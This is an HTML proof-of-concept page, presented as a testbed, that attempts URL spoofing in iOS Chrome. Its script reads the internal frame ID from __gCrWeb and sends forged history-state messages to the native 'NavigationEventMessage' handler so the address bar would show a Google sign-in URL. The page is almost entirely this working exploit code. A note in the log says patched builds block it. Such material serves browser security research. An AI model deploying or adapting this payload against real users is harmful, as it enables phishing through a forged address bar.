<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>History State Spoofing Testbed</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2em; background: #f8fafc; color: #1e293b; }
        .wrapper { max-width: 650px; margin: auto; background: #fff; padding: 24px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; }
        h2 { color: #0f172a; margin-top: 0; font-size: 1.25rem; }
        pre { background: #0f172a; color: #38bdf8; padding: 14px; border-radius: 6px; font-size: 11px; overflow-x: auto; line-height: 1.5; }
        .status-badge { display: inline-block; padding: 4px 10px; border-radius: 4px; font-size: 12px; font-weight: 600; background: #e0f2fe; color: #0369a1; }
    </style>
</head>
<body>
<div class="wrapper">
    <h2>History State Navigation Testbed</h2>
    <p>Engine Defense: <span class="status-badge">Protected by url::IsSameOriginWith()</span></p>
    
    <h3>Execution Trace:</h3>
    <pre id="log-output">Initializing harness...</pre>
</div>

<script>
(function() {
    function appendLog(message) {
        const pre = document.getElementById('log-output');
        pre.textContent += '\n[' + new Date().toLocaleTimeString() + '] ' + message;
        console.log('[TestHarness] ' + message);
    }

    appendLog("Current Origin: " + (location.origin || '(opaque)'));
    appendLog("Current Href: " + location.href);

    // 1. Deteksi message handler platform iOS Chrome
    var mh = (window.webkit && window.webkit.messageHandlers) || {};
    if (!mh.NavigationEventMessage) {
        appendLog("[-] Message handler 'NavigationEventMessage' is absent (Non-iOS or Patched environment).");
        return;
    }
    appendLog("[+] Message handler 'NavigationEventMessage' detected.");

    // 2. Ambil frame_id dari page-world __gCrWeb
    var frameId = null;
    try {
        if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
            frameId = window.__gCrWeb.getFrameId();
            appendLog("[+] Successfully resolved frame_id: " + frameId);
        }
    } catch (e) {
        appendLog("[-] Exception reading frame_id: " + e);
    }

    if (!frameId) {
        appendLog("[-] Frame ID resolution failed. Execution terminated.");
        return;
    }

    // 3. Target uji coba lintas domain
    var targetSpoof = 'blob:https://accounts.google.com/signin';

    try {
        appendLog("[*] Dispatching willChangeState command...");
        mh.NavigationEventMessage.postMessage({
            command: 'willChangeState', 
            frame_id: frameId
        });
        
        appendLog("[*] Dispatching didReplaceState with target: " + targetSpoof);
        mh.NavigationEventMessage.postMessage({
            command: 'didReplaceState', 
            frame_id: frameId,
            stateObject: '', 
            baseUrl: 'https://x/',
            pageUrl: targetSpoof
        });
        
        appendLog("[+] Payload transmitted successfully.");
        appendLog("[i] NOTE: On updated browser builds, native C++ validation intercepts this, evaluates url::IsSameOriginWith() as false, and drops the request instantly.");
    } catch (err) {
        appendLog("[-] Dispatch exception: " + err);
    }
})();
</script>
</body>
</html>
